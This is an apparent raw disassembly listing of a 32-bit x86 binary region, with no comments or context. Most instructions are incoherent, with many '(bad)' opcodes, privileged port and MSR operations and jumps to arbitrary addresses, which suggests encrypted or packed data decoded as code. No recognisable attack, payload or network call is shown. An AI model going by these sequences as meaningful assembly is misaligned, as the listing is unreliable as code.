  40b8ee:	rcr    bl,0xfd
  40b8f1:	xchg   esi,eax
  40b8f2:	rol    BYTE PTR [edi+0x6530c17a],cl
  40b8f8:	cmc    
  40b8f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8fa:	mov    bh,0x93
  40b8fc:	test   BYTE PTR [esp+edx*8-0x41403f0d],bh
  40b903:	out    0x7b,al
  40b905:	or     BYTE PTR ds:0x688333fc,dl
  40b90b:	add    eax,0x57dc50e6
  40b910:	xor    BYTE PTR [esi],al
  40b912:	aaa    
  40b913:	out    0x18,eax
  40b915:	mov    ah,0x56
  40b917:	std    
  40b918:	xor    al,0x76
  40b91a:	in     eax,0xf0
  40b91c:	dec    ebx
  40b91d:	rcr    BYTE PTR [edx+0x4f],cl
  40b920:	xchg   esi,eax
  40b921:	popf   
  40b922:	dec    eax
  40b923:	or     DWORD PTR [edx-0x2a],edx
  40b926:	push   cs
  40b927:	sub    cl,BYTE PTR [edx+0x72abdf31]
  40b92d:	shl    esi,cl
  40b92f:	pop    edi
  40b930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b931:	ins    BYTE PTR es:[edi],dx
  40b932:	shl    BYTE PTR [edx],0x3d
  40b935:	jmp    0xecaf:0x63ced955
  40b93c:	(bad)  
  40b93d:	jl     0x40b945
  40b93f:	es mov esi,0xc4b017f9
  40b945:	xchg   ecx,eax
  40b946:	mov    ch,0x8e
  40b948:	mov    cl,0x3
  40b94a:	scas   eax,DWORD PTR es:[edi]
  40b94b:	sbb    DWORD PTR [ebx-0x531347d7],edx
  40b951:	mov    dl,0xc5
  40b953:	cmp    al,0xfb
  40b955:	or     al,0x36
  40b957:	pop    eax
  40b958:	dec    ecx
  40b959:	imul   edx,edx,0x70fac863
  40b95f:	xchg   ecx,eax
  40b960:	cdq    
  40b961:	(bad)  
  40b962:	jmp    0x40b9d9
  40b964:	cmp    al,0x97
  40b966:	and    BYTE PTR [edi-0x7c],dl
  40b969:	sbb    DWORD PTR [edi-0x271802b0],edx
  40b96f:	fwait
  40b970:	or     al,0x66
  40b972:	jbe    0x40b937
  40b974:	lahf   
  40b975:	imul   ebp,DWORD PTR [ebx-0x66],0xa7c220f4
  40b97c:	inc    edi
  40b97d:	mov    esi,DWORD PTR [edx]
  40b97f:	outs   dx,DWORD PTR ds:[esi]
  40b980:	call   0x4c2449d7
  40b985:	call   0xf35a:0x298272a1
  40b98c:	pop    esp
  40b98d:	clc    
  40b98e:	ficomp DWORD PTR [ebx-0x1b]
  40b991:	add    DWORD PTR ds:0x4be71e16,0x51
  40b998:	lahf   
  40b999:	and    BYTE PTR [edx-0x744e5ddf],ch
  40b99f:	dec    esp
  40b9a0:	xchg   edx,eax
  40b9a1:	(bad)  
  40b9a2:	js     0x40b9b0
  40b9a4:	cdq    
  40b9a5:	xor    al,0x49
  40b9a7:	mov    eax,0xb28507e9
  40b9ac:	neg    BYTE PTR [ebx+ebp*2]
  40b9af:	test   al,0x6f
  40b9b1:	and    edx,DWORD PTR [ebx-0x76]
  40b9b4:	push   ebp
  40b9b5:	push   0x72
  40b9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9b8:	jne    0x40b9df
  40b9ba:	jmp    0xc83229ee
  40b9bf:	adc    ch,al
  40b9c1:	xchg   ebp,eax
  40b9c2:	sub    al,0xd7
  40b9c4:	mov    DWORD PTR [ecx-0x60b66b63],ebx
  40b9ca:	add    DWORD PTR [eax-0x1eb141e4],ebp
  40b9d0:	cmp    DWORD PTR [esi+eax*2],edi
  40b9d3:	mov    bh,0x26
  40b9d5:	aas    
  40b9d6:	add    al,0x26
  40b9d8:	sahf   
  40b9d9:	inc    esi
  40b9da:	mov    ecx,0xa97ed3f0
  40b9e0:	loope  0x40ba35
  40b9e2:	xchg   ecx,eax
  40b9e3:	mov    ebx,0xde979679
  40b9e8:	inc    ecx
  40b9e9:	jg     0x40b9e1
  40b9eb:	mov    ax,ds:0x69e7905a
  40b9f1:	cld    
  40b9f2:	ins    BYTE PTR es:[edi],dx
  40b9f3:	fsub   DWORD PTR [esi+0x53b980d3]
  40b9f9:	push   ebp
  40b9fa:	ja     0x40b9ac
  40b9fc:	cmp    DWORD PTR [edi+0x34b609e9],ebp
  40ba02:	xlat   BYTE PTR ds:[ebx]
  40ba03:	pop    eax
  40ba04:	leave  
  40ba05:	imul   edx,DWORD PTR [esi-0x6c],0xfffffffd
  40ba09:	cs dec edx
  40ba0b:	out    0x80,eax
  40ba0d:	stos   DWORD PTR es:[edi],eax
  40ba0e:	std    
  40ba0f:	mov    eax,0x38795bdc
  40ba14:	mov    edx,0xa24fb4e6
  40ba19:	cmp    DWORD PTR [eax+0x1306a6e5],edx
  40ba1f:	mov    esp,0x51da2022
  40ba24:	fisttp WORD PTR [ecx-0x212602af]
  40ba2a:	pop    ds
  40ba2b:	xor    eax,0xd2bce9aa
  40ba30:	repnz mov ch,0x50
  40ba33:	test   dl,dh
  40ba35:	dec    ebp
  40ba36:	mov    ebp,esi
  40ba38:	inc    eax
  40ba39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba3a:	jge    0x40ba21
  40ba3c:	xor    bh,0xbb
  40ba3f:	push   esi
  40ba40:	lgs    edx,FWORD PTR [edx]
  40ba43:	(bad)  
  40ba44:	fdiv   DWORD PTR [eax]
  40ba46:	je     0x40b9db
  40ba48:	test   DWORD PTR [esi],ecx
  40ba4a:	or     ebx,DWORD PTR [esi-0x16]
  40ba4d:	es jmp 0x40baac
  40ba50:	clc    
  40ba51:	icebp  
  40ba52:	or     DWORD PTR [edx],ecx
  40ba54:	je     0x40bab1
  40ba56:	mov    edx,0x9d286122
  40ba5b:	rcr    dh,0xc4
  40ba5e:	adc    DWORD PTR [edx+esi*8-0x6a],edx
  40ba62:	push   ds
  40ba63:	imul   ecx,ebx,0xfffffffb
  40ba66:	lahf   
  40ba67:	in     al,0xba
  40ba69:	fcomp  QWORD PTR [edx]
  40ba6b:	jne    0x40bac7
  40ba6d:	jmp    0x40bac9
  40ba6f:	loope  0x40ba64
  40ba71:	jmp    FWORD PTR ds:0x587386ce
  40ba77:	cmp    ch,BYTE PTR [ebp+0x21]
  40ba7a:	dec    edi
  40ba7b:	cli    
  40ba7c:	wrmsr  
  40ba7e:	pop    es
  40ba7f:	inc    esi
  40ba80:	(bad)  
  40ba81:	in     al,dx
  40ba82:	repnz aam 0xf6
  40ba85:	sub    al,BYTE PTR [edx+0x3a]
  40ba88:	xor    ebp,ebp
  40ba8a:	(bad)
  40ba8e:	push   ss
  40ba8f:	dec    esp
  40ba90:	jmp    0xdbce1bca
  40ba95:	mov    fs,edi
  40ba97:	(bad)
  40ba9a:	(bad)
  40ba9d:	in     al,dx
  40ba9e:	mov    ds:0x239cd9b1,eax
  40baa3:	rcl    DWORD PTR [edx+0x5d],1
  40baa6:	jecxz  0x40bad0
  40baa8:	add    al,0x4
  40baaa:	in     al,dx
  40baab:	mov    bl,0x63
  40baad:	adc    eax,0xe971dba3
  40bab2:	(bad)  [edx+0x425ad825]
  40bab8:	mov    al,ds:0xcd18f92e
  40babd:	mov    esi,0x78213366
  40bac2:	cmp    BYTE PTR [edi],cl
  40bac4:	push   ecx
  40bac5:	mov    BYTE PTR [edx],al
  40bac7:	xchg   ecx,eax
  40bac8:	loopne 0x40bae5
  40baca:	(bad)  
  40bacb:	xchg   esp,eax
  40bacc:	std    
  40bacd:	in     al,0x7f
  40bacf:	cmc    
  40bad0:	and    DWORD PTR [ebx-0x75216f90],edi
  40bad6:	xor    DWORD PTR [eax-0x67b6f418],0x45
  40badd:	hlt    
  40bade:	sbb    BYTE PTR [esi-0x530d45bd],ch
  40bae4:	arpl   WORD PTR ds:0x340f711,cx
  40baea:	sub    al,0x91
  40baec:	loopne 0x40bb0a
  40baee:	and    al,0x57
  40baf0:	and    eax,0x6c7df292
  40baf5:	cmp    DWORD PTR [esi+0x77594bc6],ecx
  40bafb:	cmp    DWORD PTR [ebx+0x2fbe1b3d],ebp
  40bb01:	jmp    0x7c3f9794
  40bb06:	jb     0x40bb52
  40bb08:	dec    edi
  40bb09:	pop    edx
  40bb0a:	sub    edi,DWORD PTR [ecx+0x19]
  40bb0d:	rcr    BYTE PTR [eax],cl
  40bb0f:	popa   
  40bb10:	add    BYTE PTR [ecx+eiz*2-0x254b949e],ch
  40bb17:	cdq    
  40bb18:	push   ds
  40bb19:	push   cs
  40bb1a:	inc    ebp
  40bb1b:	cs push ebx
  40bb1d:	jl     0x40bad2
  40bb1f:	adc    edx,DWORD PTR [edx+eax*4+0x4dc8260e]
  40bb26:	push   edi
  40bb27:	dec    ecx
  40bb28:	mov    al,0x7e
  40bb2a:	sub    DWORD PTR [edi+0x33],0xff8a057
  40bb31:	xchg   ebx,eax
  40bb32:	inc    edx
  40bb33:	xchg   ebp,eax
  40bb34:	ret    0x583a
  40bb37:	adc    eax,0x6c2ddfc
  40bb3c:	inc    ebx
  40bb3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb3e:	in     eax,0x20
  40bb40:	pop    ss
  40bb41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb42:	push   edi
  40bb43:	adc    DWORD PTR [ebx],ecx
  40bb45:	lods   al,BYTE PTR ds:[esi]
  40bb46:	sti    
  40bb47:	ins    BYTE PTR es:[edi],dx
  40bb48:	daa    
  40bb49:	loop   0x40bb27
  40bb4b:	fst    DWORD PTR [eax]
  40bb4d:	mov    bh,0xf0
  40bb4f:	cdq    
  40bb50:	push   es
  40bb51:	inc    edx
  40bb52:	stos   DWORD PTR es:[edi],eax
  40bb53:	mov    DWORD PTR [edi+0x48],edx
  40bb56:	fwait
  40bb57:	adc    edx,ebp
  40bb59:	(bad)  
  40bb5b:	xchg   DWORD PTR [esp+ecx*2+0xa],ebx
  40bb5f:	pop    edi
  40bb60:	in     al,0x38
  40bb62:	pop    edi
  40bb63:	sub    eax,0x29d39776
  40bb68:	push   0x11bd8214
  40bb6d:	mov    dh,0xbe
  40bb6f:	test   BYTE PTR [ebx-0x4b],bl
  40bb72:	out    dx,eax
  40bb73:	xchg   ebx,eax
  40bb74:	or     al,0x7b
  40bb76:	jl     0x40bbec
  40bb78:	dec    esp
  40bb79:	loopne 0x40bbd2
  40bb7b:	lock ret 0x13bf
  40bb7f:	sbb    al,0x92
  40bb81:	lahf   
  40bb82:	(bad)  
  40bb83:	outs   dx,BYTE PTR ds:[esi]
  40bb84:	pop    ebp
  40bb85:	out    dx,eax
  40bb86:	pop    DWORD PTR [ebx-0x17]
  40bb89:	(bad)  
  40bb8a:	int    0xc2
  40bb8c:	icebp  
  40bb8d:	cs aad 0x51
  40bb90:	(bad)  
  40bb91:	mov    esi,0xb30fe25
  40bb96:	pop    es
  40bb97:	jno    0x40bbba
  40bb99:	out    0x8f,al
  40bb9b:	add    bl,BYTE PTR [ebp-0x45fc2286]
  40bba1:	lock dec ecx
  40bba3:	leave  
  40bba4:	mov    ebp,cs
  40bba6:	xor    eax,0x6d3c6050
  40bbab:	rol    al,1
  40bbad:	push   ebx
  40bbae:	aad    0x79
  40bbb0:	enter  0x35c8,0xd6
  40bbb4:	imul   ebx,DWORD PTR [esi],0x2fe87a0f
  40bbba:	aam    0x8f
  40bbbc:	fbstp  TBYTE PTR [edx]
  40bbbe:	ins    DWORD PTR es:[edi],dx
  40bbbf:	mov    cl,0xf5
  40bbc1:	pop    ds
  40bbc2:	ja     0x40bb55
  40bbc4:	sub    edi,DWORD PTR [esp+ebp*1]
  40bbc7:	cld    
  40bbc8:	mov    ds:0x1050e764,al
  40bbcd:	pop    edi
  40bbce:	sub    esi,ecx
  40bbd0:	idiv   BYTE PTR [eax-0x414c8a22]
  40bbd6:	arpl   WORD PTR [ebp-0x33fdf73],si
  40bbdc:	out    0x6e,eax
  40bbde:	shl    DWORD PTR [esi],1
  40bbe0:	xor    edx,ebx
  40bbe2:	push   0x70
  40bbe4:	ds jg  0x40bbf5
  40bbe7:	loope  0x40bbf8
  40bbe9:	pop    edi
  40bbea:	jmp    0x28947a12
  40bbef:	or     DWORD PTR [ecx+0x280b1fe2],0x2b
  40bbf6:	outs   dx,BYTE PTR ds:[esi]
  40bbf7:	retf   0xe447
  40bbfa:	les    edx,FWORD PTR ds:0xcd7a6511
  40bc00:	pop    ebp
  40bc01:	es jnp 0x40bbbb
  40bc04:	stos   BYTE PTR es:[edi],al
  40bc05:	mov    ds:0xde1182e6,al
  40bc0a:	xchg   esi,eax
  40bc0b:	add    al,0x2c
  40bc0d:	pop    edx
  40bc0e:	inc    DWORD PTR [ebx+esi*8-0x2b]
  40bc12:	mov    edx,0x26fec4cb
  40bc17:	pmuludq mm4,QWORD PTR [edi]
  40bc1a:	cmp    eax,DWORD PTR [edx-0x6d]
  40bc1d:	mov    WORD PTR ds:[ebp-0x7e],ds
  40bc21:	push   0x39
  40bc23:	and    dh,BYTE PTR [edx-0x6cb500ef]
  40bc29:	and    cl,dh
  40bc2b:	pushf  
  40bc2c:	inc    esi
  40bc2d:	iret   
  40bc2e:	mov    ds:0xaa49e585,ax
  40bc34:	adc    al,0xde
  40bc36:	cmp    ebp,DWORD PTR [edx]
  40bc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc39:	jno    0x40bc41
  40bc3b:	fst    QWORD PTR [esi-0x26b5cf06]
  40bc41:	fninit 
  40bc43:	ror    BYTE PTR [edx],cl
  40bc45:	push   ss
  40bc46:	pop    esp
  40bc47:	push   eax
  40bc48:	retf   
  40bc49:	cmp    bh,dl
  40bc4b:	add    bh,BYTE PTR [edx]
  40bc4d:	and    ebp,DWORD PTR [edx]
  40bc4f:	sbb    DWORD PTR [esi-0x3636e390],edx
  40bc55:	mov    ah,0x2
  40bc57:	test   al,0xb4
  40bc59:	push   ss
  40bc5a:	dec    esp
  40bc5b:	test   al,0x1
  40bc5d:	xchg   BYTE PTR [ebx+0x12a487ae],ah
  40bc63:	mov    ebx,DWORD PTR [eax+0x6a70272d]
  40bc69:	and    eax,ecx
  40bc6b:	cmc    
  40bc6c:	fwait
  40bc6d:	jbe    0x40bc6c
  40bc6f:	not    DWORD PTR [ecx+0x5bac7596]
  40bc75:	jns    0x40bca3
  40bc77:	jo     0x40bc2b
  40bc79:	jp     0x40bc4b
  40bc7b:	das    
  40bc7c:	push   ecx
  40bc7d:	and    eax,0xb563927f
  40bc82:	pusha  
  40bc83:	pop    ebx
  40bc84:	lods   al,BYTE PTR ds:[esi]
  40bc85:	jae    0x40bc1f
  40bc87:	pop    ss
  40bc88:	pushf  
  40bc89:	sbb    DWORD PTR [ebx+0x6a],edi
  40bc8c:	cmp    dl,BYTE PTR [edi+0x25211052]
  40bc92:	loopne 0x40bc80
  40bc94:	mov    ebp,DWORD PTR [edx]
  40bc96:	shl    DWORD PTR [eax+0x74],0x6
  40bc9a:	xchg   DWORD PTR [edx],ecx
  40bc9c:	loope  0x40bce9
  40bc9e:	shr    BYTE PTR [ebx+0x8823d49],0x7
  40bca5:	sub    eax,0x55bcf3e9
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	add    DWORD PTR [esi-0x711bab26],edi
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	or     al,BYTE PTR [edx]
  40bce0:	inc    esp
  40bce1:	mov    bh,0xd
  40bce3:	mov    edi,0x79f146f3
  40bce8:	and    DWORD PTR [ebx],esp
  40bcea:	les    edi,FWORD PTR ds:[ecx]
  40bced:	inc    edi
  40bcee:	jb     0x40bd69
  40bcf0:	inc    edx
  40bcf1:	or     al,0x88
  40bcf3:	arpl   sp,bx
  40bcf5:	(bad)  
  40bcf6:	pop    edx
  40bcf7:	inc    esp
  40bcf8:	es (bad) 
  40bcfa:	xchg   ecx,eax
  40bcfb:	inc    eax
  40bcfc:	shr    BYTE PTR [esi],0xe6
  40bcff:	cmp    al,0x53
  40bd01:	inc    esp
  40bd02:	test   DWORD PTR [esi],0x1bd2a296
  40bd08:	jnp    0x40bca0
  40bd0a:	int    0xba
  40bd0c:	cmp    esi,DWORD PTR [ebx-0x62e7b106]
  40bd12:	popf   
  40bd13:	mov    cl,0x78
  40bd15:	mov    ebx,0xe92fd34c
  40bd1a:	inc    edx
  40bd1b:	dec    ebp
  40bd1c:	and    ecx,edx
  40bd1e:	and    eax,0x5410384f
  40bd23:	xchg   ecx,eax
  40bd24:	mov    cl,0x15
  40bd26:	dec    edx
  40bd27:	adc    BYTE PTR ds:0xff61b47b,0x46
  40bd2e:	es ins DWORD PTR es:[edi],dx
  40bd30:	mov    DWORD PTR [edi-0x76],ebp
  40bd33:	add    al,0xcd
  40bd35:	es call 0x9bfa:0xc06c12ae
  40bd3d:	or     bl,BYTE PTR ds:0x32ec73e0
  40bd43:	inc    edi
  40bd44:	sub    ecx,DWORD PTR [ecx]
  40bd46:	ret    
  40bd47:	stc    
  40bd48:	mov    cs,WORD PTR [ecx]
  40bd4a:	xor    esp,DWORD PTR ds:0x533c2d6a
  40bd50:	les    ebp,FWORD PTR [edi]
  40bd52:	stos   BYTE PTR es:[edi],al
  40bd53:	dec    esi
  40bd54:	adc    al,0x7f
  40bd56:	jmp    0x14c5:0x6287c0cd
  40bd5d:	outs   dx,BYTE PTR ss:[esi]
  40bd5f:	jmp    0xd723:0xab0166c8
  40bd66:	ror    BYTE PTR ds:[esi+0x6aba0813],cl
  40bd6d:	test   al,0xaa
  40bd6f:	push   ecx
  40bd70:	push   edx
  40bd71:	ret    0xf691
  40bd74:	dec    ah
  40bd76:	fwait
  40bd77:	push   DWORD PTR [bp+0x4e6e]
  40bd7c:	push   0xfffffffb
  40bd7e:	aam    0xd4
  40bd80:	aam    0xbd
  40bd82:	out    dx,eax
  40bd83:	inc    esp
  40bd84:	push   eax
  40bd85:	loopne 0x40bdf4
  40bd87:	popa   
  40bd88:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40bd8a:	inc    esp
  40bd8b:	cwde   
  40bd8c:	and    ah,al
  40bd8e:	push   esi
  40bd8f:	and    al,0xa1
  40bd91:	xor    eax,0x2adc4868
  40bd96:	(bad)  
  40bd97:	xchg   edx,eax
  40bd98:	je     0x40bd8c
  40bd9a:	or     al,0xd1
  40bd9c:	repz js 0x40bdbc
  40bd9f:	sbb    esp,DWORD PTR [ebx]
  40bda1:	popf   
  40bda2:	jo     0x40bd9c
  40bda4:	and    DWORD PTR [ebx-0x4e5c4423],ebp
  40bdaa:	xor    al,0x57
  40bdac:	(bad)  
  40bdad:	scas   eax,DWORD PTR es:[edi]
  40bdae:	inc    ecx
  40bdaf:	fwait
  40bdb0:	mov    eax,ds:0xe962ca4d
  40bdb5:	cmp    bl,BYTE PTR [ebp+0x1a5e81b2]
  40bdbb:	gs nop
  40bdbd:	cmp    eax,0x32ae39fc
  40bdc2:	sub    DWORD PTR [esi+eiz*8-0x57],edx
  40bdc6:	push   eax
  40bdc7:	lahf   
  40bdc8:	push   es
  40bdc9:	fist   WORD PTR [ecx-0xd]
  40bdcc:	mov    edi,0xe17d27f0
  40bdd1:	imul   eax,DWORD PTR ds:0x3e8af7e4,0x9cea109c
  40bddb:	(bad)  
  40bddc:	sub    eax,0x831e917d
  40bde1:	jmp    0xba3e8558
  40bde6:	dec    eax
  40bde7:	sub    al,BYTE PTR [ecx]
  40bde9:	(bad)  
  40bdea:	lods   eax,DWORD PTR ds:[esi]
  40bdeb:	dec    eax
  40bdec:	(bad)  
  40bded:	icebp  
  40bdee:	out    dx,eax
  40bdef:	add    eax,0xa863aaa8
  40bdf4:	mov    al,0xf3
  40bdf6:	retf   0xd371
  40bdf9:	push   esi
  40bdfa:	aaa    
  40bdfb:	shr    cl,cl
  40bdfd:	nop
  40bdfe:	mov    ah,BYTE PTR [esi+ecx*4-0x8ef61a8]
  40be05:	scas   eax,DWORD PTR es:[edi]
  40be06:	(bad)  
  40be07:	int    0x9d
  40be09:	cmp    edi,DWORD PTR [eax-0x2b19119e]
  40be0f:	push   0x60
  40be11:	retf   
  40be12:	punpckldq mm4,mm3
  40be15:	mov    esi,0x4b88dc8e
  40be1a:	mov    ds:0x8bbe97f9,al
  40be1f:	or     al,0xeb
  40be21:	rcr    DWORD PTR ds:0xa2c514ea,1
  40be27:	jb     0x40be87
  40be29:	aad    0x34
  40be2b:	dec    edx
  40be2c:	stc    
  40be2d:	push   ecx
  40be2e:	push   ebx
  40be2f:	stc    
  40be30:	adc    DWORD PTR [ebx],esi
  40be32:	push   esp
  40be33:	push   eax
  40be35:	ds out 0xb6,eax
  40be38:	fmul   DWORD PTR [ebx+0x3b88109a]
  40be3e:	mov    ds:0x5e77f726,al
  40be43:	jge    0x40be68
  40be45:	mov    al,0x2d
  40be47:	in     eax,0x5e
  40be49:	sahf   
  40be4a:	pop    edi
  40be4b:	push   esp
  40be4c:	cmp    BYTE PTR [edx+0x8],cl
  40be4f:	push   esi
  40be50:	inc    ebp
  40be51:	and    eax,0x978c7d3d
  40be56:	lods   al,BYTE PTR ds:[esi]
  40be57:	lods   eax,DWORD PTR ds:[esi]
  40be58:	lods   al,BYTE PTR ds:[esi]
  40be59:	pop    ebp
  40be5a:	xchg   esi,eax
  40be5b:	sub    eax,0x602b3afc
  40be60:	jl     0x40beb3
  40be62:	gs xchg ebp,eax
  40be64:	mov    ch,0xaa
  40be66:	lahf   
  40be67:	push   cs
  40be68:	stc    
  40be69:	loope  0x40be1b
  40be6b:	fcmovb st,st(2)
  40be6d:	test   DWORD PTR [esi-0x7f],eax
  40be70:	add    edx,ecx
  40be72:	xchg   esi,eax
  40be73:	and    al,0xf2
  40be75:	hlt    
  40be76:	push   edx
  40be77:	add    eax,0x5869f888
  40be7c:	in     al,0x15
  40be7e:	mov    bh,0x37
  40be80:	push   cs
  40be81:	xor    edi,edi
  40be83:	test   al,0x31
  40be85:	push   esi
  40be86:	add    DWORD PTR [eax+0x29fed190],edx
  40be8c:	stos   DWORD PTR es:[edi],eax
  40be8d:	je     0x40be3b
  40be8f:	ret    
  40be90:	pop    ecx
  40be91:	(bad)  
  40be93:	mov    eax,0xef08f4f8
  40be98:	(bad)  
  40be99:	loope  0x40beda
  40be9b:	mov    bl,0xdf
  40be9d:	fistp  WORD PTR [esi+0x23da7726]
  40bea3:	rcl    BYTE PTR [ecx-0x1a],1
  40bea6:	xchg   esi,eax
  40bea7:	xor    dl,BYTE PTR [edi+0x2c]
  40beaa:	jp     0x40bee0
  40beac:	inc    ebp
  40bead:	lock jl 0x40bf01
  40beb0:	push   edx
  40beb1:	xor    al,0x6
  40beb3:	push   eax
  40beb4:	inc    edx
  40beb5:	(bad)  
  40beb7:	lahf   
  40beb8:	xor    al,0xa3
  40beba:	pop    edi
  40bebb:	scas   al,BYTE PTR es:[edi]
  40bebc:	lds    ecx,FWORD PTR [edi+0x2a16307a]
  40bec2:	or     eax,0xe67a7e4d
  40bec7:	jmp    0x411e:0x89a62c1b
  40bece:	(bad)  
  40becf:	and    esi,DWORD PTR ds:0x8cb7102e
  40bed5:	sar    DWORD PTR [ebx],0xae
  40bed8:	jp     0x40be92
  40beda:	dec    bx
  40bedc:	inc    eax
  40bedd:	fcomp  DWORD PTR [ecx]
  40bedf:	mov    ds:0xe6f317ca,al
  40bee4:	fdivr  QWORD PTR [eax+0x7b]
  40bee7:	gs xchg ebp,eax
  40bee9:	mov    ah,0xa0
  40beeb:	mov    DWORD PTR [edx+esi*4],esp
  40beee:	call   0x645a:0x526bf134
  40bef5:	inc    edi
  40bef6:	daa    
  40bef7:	jmp    0xce2:0xc8910b0
  40befe:	add    eax,0x31ac0f5
  40bf03:	retf   0x219d
  40bf06:	mov    al,ds:0xb551fba7
  40bf0b:	fld    TBYTE PTR [ebx-0x78]
  40bf0e:	out    dx,al
  40bf0f:	scas   al,BYTE PTR es:[edi]
  40bf10:	int3   
  40bf11:	sub    dh,BYTE PTR [ebx-0x6e]
  40bf14:	test   DWORD PTR [ebx-0x25],0x11d5638c
  40bf1b:	mov    al,ds:0x5dec4e12
  40bf20:	leave  
  40bf21:	hlt    
  40bf22:	and    DWORD PTR [edi],ecx
  40bf24:	(bad)  
  40bf25:	js     0x40bf4c
  40bf27:	pop    ebx
  40bf28:	add    DWORD PTR [edi-0x46],ebx
  40bf2b:	loopne 0x40bf90
  40bf2d:	or     ch,ch
  40bf2f:	es adc al,0xbd
  40bf32:	cmp    DWORD PTR [ebp+0xa],edi
  40bf35:	lea    esi,[edi+eax*2]
  40bf38:	aad    0x0
  40bf3a:	and    esi,DWORD PTR [ebx]
  40bf3c:	add    eax,0xa53a518d
  40bf41:	dec    edi
  40bf43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf44:	fdivr  st,st(7)
  40bf46:	xchg   ebp,eax
  40bf47:	cli    
  40bf48:	and    BYTE PTR [edi],dh
  40bf4a:	pop    edi
  40bf4b:	mov    bl,0xf1
  40bf4d:	int    0x34
  40bf4f:	xor    BYTE PTR [ebx],cl
  40bf51:	mov    bl,0x33
  40bf53:	clc    
  40bf54:	add    DWORD PTR [edi+eax*1+0x19a5d235],ebx
  40bf5b:	scas   eax,DWORD PTR es:[edi]
  40bf5c:	xchg   ebx,ecx
  40bf5e:	cdq    
  40bf5f:	loop   0x40bfd7
  40bf61:	mov    eax,ds:0x6280f6f9
  40bf66:	lods   al,BYTE PTR ds:[esi]
  40bf67:	call   0x5606:0xd387223c
  40bf6e:	cmp    cl,bl
  40bf70:	(bad)  
  40bf71:	ins    BYTE PTR es:[edi],dx
  40bf72:	iret   
  40bf73:	dec    esp
  40bf74:	add    BYTE PTR [edx-0x3e],bh
  40bf77:	mov    ss,WORD PTR [eax+eax*4]
  40bf7a:	pop    esp
  40bf7b:	lock ret 0xde39
  40bf7f:	ret    0x8be5
  40bf82:	bnd jns 0x40bf09
  40bf85:	sub    dl,BYTE PTR [esi+0x32]
  40bf88:	lods   eax,DWORD PTR ds:[esi]
  40bf89:	aas    
  40bf8a:	xchg   esi,eax
  40bf8b:	jmp    0x2b71:0x6aded8b4
  40bf92:	pop    es
  40bf93:	jns    0x40bf78
  40bf95:	pop    esi
  40bf96:	pusha  
  40bf97:	adc    BYTE PTR [esi+0x6d],al
  40bf9a:	sub    DWORD PTR [ebx+0x59cb5cd7],ebp
  40bfa0:	into   
  40bfa1:	inc    esi
  40bfa2:	test   DWORD PTR [ebx],0x998edd99
  40bfa8:	and    al,0x56
  40bfaa:	popa   
  40bfab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfac:	repz jge 0x40c027
  40bfaf:	jae    0x40bfbe
  40bfb1:	mov    bh,0x9c
  40bfb3:	cmp    DWORD PTR [ebx+0x7f63dc41],edx
  40bfb9:	pop    ds
  40bfba:	stos   BYTE PTR es:[edi],al
  40bfbb:	cmp    eax,0xeded7ccc
  40bfc0:	imul   ebx,DWORD PTR [ebx-0x65],0xffffffdf
  40bfc4:	clc    
  40bfc5:	mov    ch,0x6c
  40bfc7:	mov    bh,0xa6
  40bfc9:	shr    BYTE PTR [ecx],cl
  40bfcb:	mov    ds:0xd27d444a,al
  40bfd0:	stos   DWORD PTR es:[edi],eax
  40bfd1:	cld    
  40bfd2:	mov    esp,0x5bad4117
  40bfd7:	push   ebx
  40bfd8:	call   0x70c6:0xeae31594
  40bfdf:	out    0x31,al
  40bfe1:	cmp    DWORD PTR es:[ebx-0x13],ebp
  40bfe5:	jg     0x40c01c
  40bfe7:	lods   al,BYTE PTR ds:[esi]
  40bfe8:	ret    0x23b3
  40bfeb:	retf   0xf360
  40bfee:	jo     0x40c00a
  40bff0:	and    al,0xda
  40bff2:	fwait
  40bff3:	out    0x7c,eax
  40bff5:	stos   DWORD PTR es:[edi],eax
  40bff6:	inc    ebp
  40bff7:	mov    WORD PTR [esi-0x78f04d89],fs
  40bffd:	rol    BYTE PTR [ecx+esi*8-0x20363f1a],0xfe
  40c005:	mov    al,ds:0xa59e618f
  40c00a:	stos   DWORD PTR es:[edi],eax
  40c00b:	not    BYTE PTR [ebx+0x37]
  40c00e:	test   BYTE PTR [edi-0x679802d],bh
  40c014:	mov    esp,0x9a8b6f24
  40c019:	int    0xa7
  40c01b:	inc    ebp
  40c01c:	cmp    ecx,esp
  40c01e:	les    eax,FWORD PTR [esp+esi*4]
  40c021:	imul   ebx,DWORD PTR [esi],0x3ed13888
  40c027:	xchg   edi,eax
  40c028:	test   BYTE PTR [ecx-0x3f9c996f],0xf8
  40c02f:	xchg   ecx,eax
  40c030:	fisubr WORD PTR [eax+0x699abced]
  40c036:	adc    DWORD PTR [ebp+edi*1-0x350bfba1],esi
  40c03d:	mov    al,ds:0xc5820240
  40c042:	xor    DWORD PTR [edi-0x62],esp
  40c045:	xchg   BYTE PTR [eax+esi*8],dl
  40c048:	loope  0x40c098
  40c04a:	pop    edi
  40c04b:	js     0x40c080
  40c04d:	ins    BYTE PTR es:[edi],dx
  40c04e:	or     eax,0xe374c3fb
  40c053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c054:	daa    
  40c055:	sbb    al,0xa3
  40c057:	cli    
  40c058:	int3   
